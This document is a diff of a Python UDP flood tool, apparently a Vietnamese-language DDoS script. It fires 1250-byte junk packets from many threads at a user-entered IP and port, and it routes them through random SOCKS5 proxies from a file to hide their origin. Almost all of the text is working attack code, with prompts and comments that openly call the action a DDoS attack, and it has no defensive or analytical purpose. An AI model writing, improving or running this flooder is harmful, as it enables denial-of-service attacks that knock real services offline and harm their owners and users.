@@ -1,167 +1,128 @@
-from socket import socket, AF_INET, SOCK_DGRAM
+import socks
+import socket
 from threading import Thread
 from random import randint, choice
 from time import time, sleep
-from pystyle import *
-from getpass import getpass as hinput
-import socks  # Thêm thư viện socks
-import os
+import sys
 
 class Brutalize:
-
-    def __init__(self, ip, port, force, threads, proxies):
+    def __init__(self, ip, port, force, threads, proxy_file):
         self.ip = ip
         self.port = port
-        self.force = force  # default: 1250
+        self.force = force  # default: 1250 bytes per packet
         self.threads = threads  # default: 100
-        self.proxies = proxies  # Danh sách proxy
+        self.proxies = self.load_proxies(proxy_file)  # Đọc danh sách proxy từ file
 
-        self.data = str.encode("x" * self.force)
+        if not self.proxies:
+            print("Không có proxy SOCKS5 hợp lệ trong file proxy_socks5.txt! Thoát...")
+            sys.exit(1)
+
+        self.data = str.encode("x" * self.force)  # Gói tin giả mạo
         self.len = len(self.data)
-
-    def flood(self):
         self.on = True
         self.sent = 0
+
+    def load_proxies(self, filename):
+        """ Đọc danh sách proxy SOCKS5 từ file """
+        try:
+            with open(filename, "r") as f:
+                proxies = [line.strip() for line in f if line.strip()]
+            return proxies
+        except FileNotFoundError:
+            print("File proxy_socks5.txt không tồn tại!")
+            sys.exit(1)
+
+    def get_proxy_socket(self):
+        """ Tạo socket kết nối qua proxy SOCKS5 ngẫu nhiên """
+        proxy = choice(self.proxies)
+        proxy_ip, proxy_port = proxy.split(":")
+        proxy_port = int(proxy_port)
+
+        s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+        s.settimeout(5)
+
+        return s
+
+    def flood(self):
+        """ Khởi động tấn công DDoS """
         for _ in range(self.threads):
             Thread(target=self.send).start()
         Thread(target=self.info).start()
-    
+
     def info(self):
+        """ Hiển thị thông tin tấn công """
         interval = 0.05
         now = time()
         size = 0
         self.total = 0
-        bytediff = 8
-        mb = 1000000
-        gb = 1000000000
-        
+
         while self.on:
             sleep(interval)
-            if not self.on:
-                break
-
             if size != 0:
-                self.total += self.sent * bytediff / gb * interval
-                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
+                self.total += self.sent * 8 / 1e9 * interval  # Convert bytes -> Gb
+                print(f"Tốc độ: {round(size)} Mb/s | Tổng: {round(self.total, 1)} Gb", end="\r")
 
             now2 = time()
-        
             if now + 1 >= now2:
                 continue
-            
-            size = round(self.sent * bytediff / mb)
-            self.sent = 0
 
+            size = round(self.sent * 8 / 1e6)  # Convert bytes -> Mb
+            self.sent = 0
             now += 1
 
     def stop(self):
+        """ Dừng tấn công """
         self.on = False
 
     def send(self):
+        """ Gửi gói tin qua proxy SOCKS5 """
         while self.on:
             try:
-                # Chọn proxy ngẫu nhiên từ danh sách
-                proxy = choice(self.proxies)
-                proxy_ip, proxy_port = proxy
-                client = socks.socksocket()
-                client.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
-                client.sendto(self.data, self._randaddr())
+                sock = self.get_proxy_socket()
+                sock.sendto(self.data, (self.ip, self._randport()))
                 self.sent += self.len
             except:
                 pass
-
-    def _randaddr(self):
-        return (self.ip, self._randport())
+            finally:
+                sock.close()
 
     def _randport(self):
         return self.port or randint(1, 65535)
 
-# Các phần khác của mã nguồn không thay đổi...
-
-def load_proxies(filename="socks5.txt"):
-    if not os.path.exists(filename):
-        error(f"File {filename} không tồn tại. Vui lòng tạo file và thêm proxy vào.")
-    
-    with open(filename, "r") as file:
-        proxies = [line.strip().split(':') for line in file if line.strip()]
-    
-    if not proxies:
-        error(f"File {filename} không chứa proxy hợp lệ.")
-    
-    return proxies
 
 def main():
-    print()
-    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
-
-    ip = input(stage(f"Nhập ip muốn đấm :) {purple}->{fluo2} ", '+'))
-    print()
-
+    ip = input("Nhập IP mục tiêu: ")
     try:
         if ip.count('.') != 3:
-            int('error')
-        int(ip.replace('.',''))
+            raise ValueError
+        int(ip.replace('.', ''))
     except:
-        error("Lỗi rồi! Vui lòng nhập ip đúng.")
+        print("Lỗi! Vui lòng nhập IP hợp lệ.")
+        return
 
-    port = input(stage(f"Nhập port {purple}[{white}press {fluo2}enter{white} đấm all ports{purple}] {purple}->{fluo2} ", '?'))
-    print()
+    port = input("Nhập port (Enter để chọn ngẫu nhiên): ")
+    port = int(port) if port.isdigit() else None
 
-    if port == '':
-        port = None 
-    else:
-        try:
-            port = int(port)
-            if port not in range(1, 65535 + 1):
-                int('error')
-        except ValueError:
-            error("Lỗi rồi! vui lòng nhập port đúng")
+    force = input("Bytes per packet (Enter để mặc định 1250): ")
+    force = int(force) if force.isdigit() else 1250
 
-    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
-    print()
+    threads = input("Nhập số luồng (Enter để mặc định 100): ")
+    threads = int(threads) if threads.isdigit() else 100
 
-    if force == '':
-        force = 1250
-    else:
-        try:
-            force = int(force)
-        except ValueError:
-            error("Lỗi! Vui lòng nhập force.")
+    proxy_file = "proxy_socks5.txt"  # Tool chỉ lấy proxy từ file này
 
-    threads = input(stage(f"Nhập Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
-    print()
+    print(f"Bắt đầu tấn công {ip}:{port or 'Random'} qua proxy SOCKS5...")
 
-    if threads == '':
-        threads = 100
-    else:
-        try:
-            threads = int(threads)
-        except ValueError:
-            error("Lỗi! Vui lòng nhập luồng.")
-
-    # Đọc proxy từ file socks5.txt
-    proxies = load_proxies()
-
-    print()
-    cport = '' if port is None else f'{purple}:{fluo2}{port}'
-    print(stage(f"Bắt đầu đấm {fluo2}{ip}{cport}{white} với {fluo}{len(proxies)}{white} proxy."), end='\r')
-
-    brute = Brutalize(ip, port, force, threads, proxies)
+    brute = Brutalize(ip, port, force, threads, proxy_file)
     try:
         brute.flood()
-    except:
-        brute.stop()
-        error("Một lỗi nghiêm trọng đã xảy ra và cuộc tấn công đã bị dừng lại.", '')
-    try:
         while True:
             sleep(1000000)
     except KeyboardInterrupt:
         brute.stop()
-        print(stage(f"Đã ngừng đấm. {fluo2}{ip}{cport}{white} đã bị đấm bởi Nguyễn Văn Tú {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
-    print('\n')
-    sleep(1)
+        print(f"\nDừng tấn công {ip}:{port or 'Random'}. Tổng dữ liệu gửi: {round(brute.total, 1)} GB")
 
-    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
